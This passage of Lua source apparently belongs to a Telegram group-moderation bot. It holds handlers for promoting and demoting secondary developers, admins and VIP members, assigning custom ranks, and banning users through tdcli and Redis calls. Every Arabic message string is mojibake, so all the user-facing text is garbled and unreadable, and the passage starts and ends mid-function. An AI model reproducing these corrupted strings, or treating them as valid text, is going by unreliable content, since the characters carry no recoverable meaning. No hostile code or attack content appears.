   Reply_Status(msg,result.sender_user_id_,"reply"," β ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ ΩΩ Ψ§ΩΨ¨ΩΨͺ")  
   end
   tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_DRAGON, nil)
   return false 
   end
   if text and text:match("^Ψ±ΩΨΉ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ @(.*)$") and Owner(msg) then
   local username = text:match("^Ψ±ΩΨΉ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ @(.*)$")
   function Function_DRAGON(extra, result, success)
   if result.id_ then
   if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
   send(msg.chat_id_,msg.id_," β ΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !")   
   return false 
   end      
   database:sadd(bot_id.."Dev:SoFi:2", result.id_)
   Reply_Status(msg,result.id_,"reply"," β ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ ΩΩ Ψ§ΩΨ¨ΩΨͺ")  
   else
   send(msg.chat_id_, msg.id_," β ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
   end
   end
   tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_DRAGON, nil)
   return false 
   end
   if text and text:match("^Ψ±ΩΨΉ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ (%d+)$") and Owner(msg) then
   local userid = text:match("^Ψ±ΩΨΉ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ (%d+)$")
   database:sadd(bot_id.."Dev:SoFi:2", userid)
   Reply_Status(msg,userid,"reply"," β ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ ΩΩ Ψ§ΩΨ¨ΩΨͺ")  
   return false 
   end
   if text == ("ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ") and tonumber(msg.reply_to_message_id_) ~= 0 and Owner(msg) then
   function Function_DRAGON(extra, result, success)
   database:srem(bot_id.."Dev:SoFi:2", result.sender_user_id_)
   Reply_Status(msg,result.sender_user_id_,"reply","β ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩΩΩ")  
   end
   tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_DRAGON, nil)
   return false 
   end
   if text and text:match("^ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ @(.*)$") and Owner(msg) then
   local username = text:match("^ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ @(.*)$")
   function Function_DRAGON(extra, result, success)
   if result.id_ then
   database:srem(bot_id.."Dev:SoFi:2", result.id_)
   Reply_Status(msg,result.id_,"reply","β ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩΩΩ")  
   else
   send(msg.chat_id_, msg.id_,"β ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
   end
   end
   tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_DRAGON, nil)
   return false
   end  
   if text and text:match("^ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ (%d+)$") and Owner(msg) then
   local userid = text:match("^ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ (%d+)$")
   database:srem(bot_id.."Dev:SoFi:2", userid)
   Reply_Status(msg,userid,"reply","β ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩΩΩ")  
   return false 
   end
   if text == ("Ψ§ΩΨ«Ψ§ΩΩΩΩ") and Owner(msg) then
   local list = database:smembers(bot_id.."Dev:SoFi:2")
   t = "\n β  ΩΨ§Ψ¦ΩΨ© ΩΨ·ΩΨ±ΩΩ Ψ§ΩΨ«Ψ§ΩΩΩΩΩ ΩΩΨ¨ΩΨͺ \nβ©ββββββ©πΞΞπβ©ββββββ©\n"
   for k,v in pairs(list) do
   local username = database:get(bot_id.."user:Name" .. v)
   if username then
   t = t..""..k.."- ([@"..username.."])\n"
   else
   t = t..""..k.."- (`"..v.."`)\n"
   end
   end
   if #list == 0 then
   t = " β  ΩΨ§ ΩΩΨ¬Ψ― ΩΨ·ΩΨ±ΩΩ Ψ«Ψ§ΩΩΩΩΩ"
   end
   send(msg.chat_id_, msg.id_, t)
   end
   if text == ("ΩΨ³Ψ­ Ψ§ΩΨ«Ψ§ΩΩΩΩ") and Owner(msg) then
   database:del(bot_id.."Dev:SoFi:2")
   send(msg.chat_id_, msg.id_, "\n β ΨͺΩ ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΨ·ΩΨ±ΩΩ Ψ§ΩΨ«Ψ§ΩΩΩΩ  ")
   end

if text == ("Ψ±ΩΨΉ Ψ§Ψ―ΩΩ") and tonumber(msg.reply_to_message_id_) ~= 0 and Owner(msg) then 
if not Constructor(msg) and database:get(bot_id.."Add:Group:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'ββΏΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ±ΩΨΉ Ψ§Ψ­Ψ― ΩΨ°Ψ§ΩΩ ΩΨ§Ω ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ')
return false
end
function Function_Tshake(extra, result, success)
database:sadd(bot_id.."Tshake:Mod:User"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","πβΏΨͺΩ ΨͺΨ±ΩΩΨͺΩ Ψ§Ψ―ΩΩ ΩΩΩΨ¬ΩΩΨΉΩ")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^Ψ±ΩΨΉ Ψ§Ψ―ΩΩ @(.*)$") and Owner(msg) then 
local username = text:match("^Ψ±ΩΨΉ Ψ§Ψ―ΩΩ @(.*)$")
if not Constructor(msg) and database:get(bot_id.."Add:Group:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'ββΏΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ±ΩΨΉ Ψ§Ψ­Ψ― ΩΨ°Ψ§ΩΩ ΩΨ§Ω ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ')
return false
end
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"πβΏΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !")   
return false 
end      
database:sadd(bot_id.."Tshake:Mod:User"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","πβΏΨͺΩ ΨͺΨ±ΩΩΨͺΩ Ψ§Ψ―ΩΩ ΩΩΩΨ¬ΩΩΨΉΩ")  
else
send(msg.chat_id_, msg.id_,"πβΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
if text and text:match("^Ψ±ΩΨΉ Ψ§Ψ―ΩΩ (%d+)$") and Owner(msg) then 
local userid = text:match("^Ψ±ΩΨΉ Ψ§Ψ―ΩΩ (%d+)$")
if not Constructor(msg) and database:get(bot_id.."Add:Group:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'ββΏΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ±ΩΨΉ Ψ§Ψ­Ψ― ΩΨ°Ψ§ΩΩ ΩΨ§Ω ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ')
return false
end
database:sadd(bot_id.."Tshake:Mod:User"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","πβΏΨͺΩ ΨͺΨ±ΩΩΨͺΩ Ψ§Ψ―ΩΩ ΩΩΩΨ¬ΩΩΨΉΩ")  
return false
end
if text == ("ΨͺΩΨ²ΩΩ Ψ§Ψ―ΩΩ") and tonumber(msg.reply_to_message_id_) ~= 0 and Owner(msg) then 
function Function_Tshake(extra, result, success)
database:srem(bot_id.."Tshake:Mod:User"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","πβΏΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§Ψ―ΩΩΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^ΨͺΩΨ²ΩΩ Ψ§Ψ―ΩΩ @(.*)$") and Owner(msg) then 
local username = text:match("^ΨͺΩΨ²ΩΩ Ψ§Ψ―ΩΩ @(.*)$") 
function Function_Tshake(extra, result, success)
if result.id_ then
database:srem(bot_id.."Tshake:Mod:User"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","πβΏΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§Ψ―ΩΩΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ")  
else
send(msg.chat_id_, msg.id_,"πβΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
if text and text:match("^ΨͺΩΨ²ΩΩ Ψ§Ψ―ΩΩ (%d+)$") and Owner(msg) then 
local userid = text:match("^ΨͺΩΨ²ΩΩ Ψ§Ψ―ΩΩ (%d+)$")
database:srem(bot_id.."Tshake:Mod:User"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","πβΏΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§Ψ―ΩΩΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ")  
return false
end

if text == ("Ψ±ΩΨΉ ΩΩΩΨ²") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then 
if not Constructor(msg) and database:get(bot_id.."Add:Group:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'ββΏΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ±ΩΨΉ Ψ§Ψ­Ψ― ΩΨ°Ψ§ΩΩ ΩΨ§Ω ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ')
return false
end
function Function_Tshake(extra, result, success)
database:sadd(bot_id.."Tshake:Special:User"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","πβΏΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΩΩΨ² ΩΩΩΨ¬ΩΩΨΉΩ")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^Ψ±ΩΨΉ ΩΩΩΨ² @(.*)$") and Addictive(msg) then 
local username = text:match("^Ψ±ΩΨΉ ΩΩΩΨ² @(.*)$") 
if not Constructor(msg) and database:get(bot_id.."Add:Group:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'ββΏΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ±ΩΨΉ Ψ§Ψ­Ψ― ΩΨ°Ψ§ΩΩ ΩΨ§Ω ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ')
return false
end
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"πβΏΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !")   
return false 
end      
database:sadd(bot_id.."Tshake:Special:User"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","πβΏΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΩΩΨ² ΩΩΩΨ¬ΩΩΨΉΩ")  
else
send(msg.chat_id_, msg.id_,"πβΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end

if text and text:match("^Ψ±ΩΨΉ ΩΩΩΨ² (%d+)$") and Addictive(msg) then 
local userid = text:match("^Ψ±ΩΨΉ ΩΩΩΨ² (%d+)$")
if not Constructor(msg) and database:get(bot_id.."Add:Group:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'ββΏΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ±ΩΨΉ Ψ§Ψ­Ψ― ΩΨ°Ψ§ΩΩ ΩΨ§Ω ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ')
return false
end
database:sadd(bot_id.."Tshake:Special:User"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","πβΏΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΩΩΨ² ΩΩΩΨ¬ΩΩΨΉΩ")  
return false
end

if (text == ("ΨͺΩΨ²ΩΩ ΩΩΩΨ²")) and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then 
function Function_Tshake(extra, result, success)
database:srem(bot_id.."Tshake:Special:User"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","πβΏΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΩΩΨ²ΩΩ")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΩΩΨ² @(.*)$") and Addictive(msg) then 
local username = text:match("^ΨͺΩΨ²ΩΩ ΩΩΩΨ² @(.*)$") 
function Function_Tshake(extra, result, success)
if result.id_ then
database:srem(bot_id.."Tshake:Special:User"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","πβΏΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΩΩΨ²ΩΩ")  
else
send(msg.chat_id_, msg.id_,"πβΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΩΩΨ² (%d+)$") and Addictive(msg) then 
local userid = text:match("^ΨͺΩΨ²ΩΩ ΩΩΩΨ² (%d+)$") 
database:srem(bot_id.."Tshake:Special:User"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","πβΏΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΩΩΨ²ΩΩ")  
return false
end  
if text and text:match("Ψ±ΩΨΉ (.*)") and tonumber(msg.reply_to_message_id_) > 0 and Addictive(msg) then 
local RTPA = text:match("Ψ±ΩΨΉ (.*)")
if database:sismember(bot_id.."Tshake:Coomds"..msg.chat_id_,RTPA) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local Tshakert = database:get(bot_id.."Tshake:Comd:New:rt:bot:"..RTPA..msg.chat_id_)
if Tshakert == "ΩΩΩΨ²" and Addictive(msg) then
send(msg.chat_id_, msg.id_,"\nπ€βΏΨ§ΩΨΉΨΆΩ Β» ["..data.first_name_.."](t.me/"..(data.username_ or "BOBBW")..")".."\nπβΏΨͺΩ Ψ±ΩΨΉΩ "..RTPA.." ΩΩΨ§\n")   
database:set(bot_id.."Tshake:Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,RTPA) 
database:sadd(bot_id.."Tshake:Special:User"..msg.chat_id_,result.sender_user_id_)  
elseif Tshakert == "Ψ§Ψ―ΩΩ" and Owner(msg) then 
send(msg.chat_id_, msg.id_,"\nπ€βΏΨ§ΩΨΉΨΆΩ Β» ["..data.first_name_.."](t.me/"..(data.username_ or "BOBBW")..")".."\nπβΏΨͺΩ Ψ±ΩΨΉΩ "..RTPA.." ΩΩΨ§\n")   
database:set(bot_id.."Tshake:Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,RTPA)
database:sadd(bot_id.."Tshake:Mod:User"..msg.chat_id_,result.sender_user_id_)  
elseif Tshakert == "ΩΨ―ΩΨ±" and Constructor(msg) then
send(msg.chat_id_, msg.id_,"\nπ€βΏΨ§ΩΨΉΨΆΩ Β» ["..data.first_name_.."](t.me/"..(data.username_ or "BOBBW")..")".."\nπβΏΨͺΩ Ψ±ΩΨΉΩ "..RTPA.." ΩΩΨ§\n")   
database:set(bot_id.."Tshake:Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,RTPA)  
database:sadd(bot_id.."Tshake:Manager"..msg.chat_id_,result.sender_user_id_)  
elseif Tshakert == "ΨΉΨΆΩ" and Addictive(msg) then
send(msg.chat_id_, msg.id_,"\nπ€βΏΨ§ΩΨΉΨΆΩ Β» ["..data.first_name_.."](t.me/"..(data.username_ or "BOBBW")..")".."\nπβΏΨͺΩ Ψ±ΩΨΉΩ "..RTPA.." ΩΩΨ§\n")   
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("ΨͺΩΨ²ΩΩ (.*)") and tonumber(msg.reply_to_message_id_) > 0 and Addictive(msg) then 
local RTPA = text:match("ΨͺΩΨ²ΩΩ (.*)")
if database:sismember(bot_id.."Tshake:Coomds"..msg.chat_id_,RTPA) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local Tshakert = database:get(bot_id.."Tshake:Comd:New:rt:bot:"..RTPA..msg.chat_id_)
if Tshakert == "ΩΩΩΨ²" and Addictive(msg) then
send(msg.chat_id_, msg.id_,"\nπ€βΏΨ§ΩΨΉΨΆΩ Β» ["..data.first_name_.."](t.me/"..(data.username_ or "BOBBW")..")".."\nπβΏΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ "..RTPA.." ΩΩΨ§\n")   
database:srem(bot_id.."Tshake:Special:User"..msg.chat_id_,result.sender_user_id_)  
database:del(bot_id.."Tshake:Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif Tshakert == "Ψ§Ψ―ΩΩ" and Owner(msg) then 
send(msg.chat_id_, msg.id_,"\nπ€βΏΨ§ΩΨΉΨΆΩ Β» ["..data.first_name_.."](t.me/"..(data.username_ or "BOBBW")..")".."\nπβΏΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ "..RTPA.." ΩΩΨ§\n")   
database:srem(bot_id.."Tshake:Mod:User"..msg.chat_id_,result.sender_user_id_) 
database:del(bot_id.."Tshake:Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif Tshakert == "ΩΨ―ΩΨ±" and Constructor(msg) then
send(msg.chat_id_, msg.id_,"\nπ€βΏΨ§ΩΨΉΨΆΩ Β» ["..data.first_name_.."](t.me/"..(data.username_ or "BOBBW")..")".."\nπβΏΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ "..RTPA.." ΩΩΨ§\n")   
database:srem(bot_id.."Tshake:Manager"..msg.chat_id_,result.sender_user_id_)  
database:del(bot_id.."Tshake:Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif Tshakert == "ΨΉΨΆΩ" and Addictive(msg) then
send(msg.chat_id_, msg.id_,"\nπ€βΏΨ§ΩΨΉΨΆΩ Β» ["..data.first_name_.."](t.me/"..(data.username_ or "BOBBW")..")".."\nπβΏΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ "..RTPA.." ΩΩΨ§\n")   
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("^Ψ±ΩΨΉ (.*) @(.*)") and Addictive(msg) then 
local text1 = {string.match(text, "^(Ψ±ΩΨΉ) (.*) @(.*)$")}
if database:sismember(bot_id.."Tshake:Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local Tshakert = database:get(bot_id.."Tshake:Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if Tshakert == "ΩΩΩΨ²" and Addictive(msg) then
send(msg.chat_id_, msg.id_,"\nπ€βΏΨ§ΩΨΉΨΆΩ Β» ["..result.title_.."](t.me/"..(text1[3] or "BOBBW")..")".."\nπβΏΨͺΩ Ψ±ΩΨΉΩ "..text1[2].." ΩΩΨ§")   
database:sadd(bot_id.."Tshake:Special:User"..msg.chat_id_,result.id_)  
database:set(bot_id.."Tshake:Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif Tshakert == "Ψ§Ψ―ΩΩ" and Owner(msg) then 
send(msg.chat_id_, msg.id_,"\nπ€βΏΨ§ΩΨΉΨΆΩ Β» ["..result.title_.."](t.me/"..(text1[3] or "BOBBW")..")".."\nπβΏΨͺΩ Ψ±ΩΨΉΩ "..text1[2].." ΩΩΨ§")   
database:sadd(bot_id.."Tshake:Mod:User"..msg.chat_id_,result.id_)  
database:set(bot_id.."Tshake:Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif Tshakert == "ΩΨ―ΩΨ±" and Constructor(msg) then
send(msg.chat_id_, msg.id_,"\nπ€βΏΨ§ΩΨΉΨΆΩ Β» ["..result.title_.."](t.me/"..(text1[3] or "BOBBW")..")".."\nπβΏΨͺΩ Ψ±ΩΨΉΩ "..text1[2].." ΩΩΨ§")   
database:sadd(bot_id.."Tshake:Manager"..msg.chat_id_,result.id_)  
database:set(bot_id.."Tshake:Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif Tshakert == "ΨΉΨΆΩ" and Addictive(msg) then
send(msg.chat_id_, msg.id_,"\nπ€βΏΨ§ΩΨΉΨΆΩ Β» ["..result.title_.."](t.me/"..(text1[3] or "BOBBW")..")".."\nπβΏΨͺΩ Ψ±ΩΨΉΩ "..text1[2].." ΩΩΨ§")   
end
else
info = "πβΏΨ§ΩΩΨΉΨ±Ω ΨΊΩΨ·"
send(msg.chat_id_, msg.id_,info)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end 
end
if text and text:match("^ΨͺΩΨ²ΩΩ (.*) @(.*)") and Addictive(msg) then 
local text1 = {string.match(text, "^(ΨͺΩΨ²ΩΩ) (.*) @(.*)$")}
if database:sismember(bot_id.."Tshake:Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local Tshakert = database:get(bot_id.."Tshake:Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if Tshakert == "ΩΩΩΨ²" and Addictive(msg) then
send(msg.chat_id_, msg.id_,"\nπ€βΏΨ§ΩΨΉΨΆΩ Β» ["..result.title_.."](t.me/"..(text1[3] or "BOBBW")..")".."\nπ‘βΏΨͺΩ ΨͺΩΨ±ΩΩΩ ΩΩ "..text1[2].." ΩΩΨ§")   
database:srem(bot_id.."Tshake:Special:User"..msg.chat_id_,result.id_)  
database:del(bot_id.."Tshake:Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif Tshakert == "Ψ§Ψ―ΩΩ" and Owner(msg) then 
send(msg.chat_id_, msg.id_,"\nπ€βΏΨ§ΩΨΉΨΆΩ Β» ["..result.title_.."](t.me/"..(text1[3] or "BOBBW")..")".."\nπ‘βΏΨͺΩ ΨͺΩΨ±ΩΩΩ ΩΩ "..text1[2].." ΩΩΨ§")   
database:srem(bot_id.."Tshake:Mod:User"..msg.chat_id_,result.id_)  
database:del(bot_id.."Tshake:Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif Tshakert == "ΩΨ―ΩΨ±" and Constructor(msg) then
send(msg.chat_id_, msg.id_,"\nπ€βΏΨ§ΩΨΉΨΆΩ Β» ["..result.title_.."](t.me/"..(text1[3] or "BOBBW")..")".."\nπ‘βΏΨͺΩ ΨͺΩΨ±ΩΩΩ ΩΩ "..text1[2].." ΩΩΨ§")   
database:srem(bot_id.."Tshake:Manager"..msg.chat_id_,result.id_)  
database:del(bot_id.."Tshake:Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif Tshakert == "ΨΉΨΆΩ" and Addictive(msg) then
send(msg.chat_id_, msg.id_,"\nπ€βΏΨ§ΩΨΉΨΆΩ Β» ["..result.title_.."](t.me/"..(text1[3] or "BOBBW")..")".."\nπ‘βΏΨͺΩ ΨͺΩΨ±ΩΩΩ ΩΩ "..text1[2].." ΩΩΨ§")   
end
else
info = "πβΏΨ§ΩΩΨΉΨ±Ω ΨΊΩΨ·"
send(msg.chat_id_, msg.id_,info)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end  
end

if text == ("Ψ­ΨΈΨ±") and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not Constructor(msg) and database:get(bot_id.."Ban:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'πβΏΩΩΨ― ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ­ΨΈΨ± Ω Ψ§ΩΨ·Ψ±Ψ― ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ')
return false
end
function Function_Tshake(extra, result, success)
if Rank_Checking(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\nπβΏΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(result.sender_user_id_,msg.chat_id_).." )")
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"πβΏΩΩΨ³ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ­ΨΈΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ ΩΨ±Ψ¬Ω ΨͺΩΨΉΩΩΩΨ§ !") 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"πΈβΏΨ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ !") 
return false  
end
database:sadd(bot_id.."Tshake:Ban:User"..msg.chat_id_, result.sender_user_id_)
Kick_Group(result.chat_id_, result.sender_user_id_)
